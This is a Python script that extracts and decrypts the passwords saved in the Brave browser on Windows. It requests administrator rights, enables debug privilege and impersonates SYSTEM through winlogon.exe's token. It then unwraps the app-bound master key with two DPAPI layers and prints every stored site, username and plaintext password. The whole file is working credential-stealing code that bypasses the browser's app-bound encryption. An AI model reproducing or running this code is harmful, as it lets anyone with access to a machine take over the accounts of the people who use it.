import os
import json
import base64
import sqlite3
import shutil
import ctypes
import sys
import win32crypt
import win32security
import win32api
import win32con
import psutil
from Cryptodome.Cipher import AES

# --- 1. System Privilege & Impersonation ---

def enable_debug_privilege():
    try:
        h_token = win32security.OpenProcessToken(win32api.GetCurrentProcess(), 
                                               win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY)
        priv_id = win32security.LookupPrivilegeValue(None, win32security.SE_DEBUG_NAME)
        win32security.AdjustTokenPrivileges(h_token, 0, [(priv_id, win32security.SE_PRIVILEGE_ENABLED)])
        print("[+] SeDebugPrivilege enabled")
        return True
    except Exception as e:
        print(f"[-] Failed to enable SeDebugPrivilege: {e}")
        return False

def impersonate_system():
    target_pid = None
    for proc in psutil.process_iter(['name', 'pid']):
        if proc.info['name'].lower() == 'winlogon.exe':
            target_pid = proc.info['pid']
            break
    if not target_pid: return False
    
    print(f"[+] Impersonating SYSTEM via winlogon.exe (pid={target_pid})")
    h_proc = win32api.OpenProcess(win32con.PROCESS_QUERY_INFORMATION, False, target_pid)
    h_tok = win32security.OpenProcessToken(h_proc, win32security.TOKEN_DUPLICATE | win32security.TOKEN_QUERY)
    new_tok = win32security.DuplicateTokenEx(h_tok, win32security.SecurityImpersonation, 
                                           win32security.TOKEN_ALL_ACCESS, win32security.TokenPrimary)
    win32security.ImpersonateLoggedOnUser(new_tok)
    return True

# --- 2. Nested Key Extraction ---

def get_master_key():
    path = os.path.join(os.environ["USERPROFILE"], r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State")
    with open(path, "r", encoding="utf-8") as f:
        local_state = json.load(f)

    print(f"[*] Extracting master keys from: {path}")
    
    if "app_bound_encrypted_key" in local_state["os_crypt"]:
        raw_blob = base64.b64decode(local_state["os_crypt"]["app_bound_encrypted_key"])
        
        # Friendly Debug Output
        prefix = raw_blob[:4]
        print(f"[*] app_bound prefix: {prefix.hex()} ({prefix})")
        
        # Strip 'APPB'
        app_bound_blob = raw_blob[4:] 

        # STAGE 1: SYSTEM LAYER
        enable_debug_privilege()
        impersonate_system()
        stage1_key = win32crypt.CryptUnprotectData(app_bound_blob, None, None, None, 0)[1]
        print(f"[+] First DPAPI (SYSTEM): {len(stage1_key)} bytes")

        # STAGE 2: USER LAYER
        win32security.RevertToSelf() 
        final_blob = win32crypt.CryptUnprotectData(stage1_key, None, None, None, 0)[1]
        print(f"[+] Second DPAPI (user): {len(final_blob)} bytes")
        
        # Final Slicing (The Key is the last 32 bytes)
        master_key = final_blob[-32:]
        print(f"[DBG] s={len(final_blob)} plen=32 sub[8]={hex(master_key[0])}")
        print(f"[+] v20 key (app-bound): {master_key.hex()}")
        
        return master_key
    return None

# --- 3. Password Decryption ---

def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        ciphertext = payload[:-16]
        tag = payload[-16:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(ciphertext, tag).decode('utf-8')
    except:
        return "[Decryption Error]"

# --- 4. Main Execution ---

def main():
    # Trigger Admin UAC Popup
    if not ctypes.windll.shell32.IsUserAnAdmin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        return

    master_key = get_master_key()
    if not master_key:
        print("[-] Could not retrieve Master Key.")
        return

    db_path = os.path.join(os.environ["USERPROFILE"], 
        r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Login Data")
    
    temp_db = "brave_decrypted.db"
    shutil.copyfile(db_path, temp_db)

    conn = sqlite3.connect(temp_db)
    cursor = conn.cursor()
    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
    
    rows = cursor.fetchall()
    print(f"\n[+] Recovered {len(rows)} password(s):")
    print(f"{'#':<3} | {'URL':<40} | {'Username':<20} | {'Password'}")
    print("-" * 100)

    for i, (url, user, enc_pass) in enumerate(rows, 1):
        if enc_pass and enc_pass.startswith(b'v20'):
            dec_pass = decrypt_password(enc_pass, master_key)
            print(f"{i:<3} | {url[:40]:<40} | {user:<20} | {dec_pass}")

    conn.close()
    os.remove(temp_db)
    input("\nProcess Complete. Press Enter to exit...")

if __name__ == "__main__":
    main()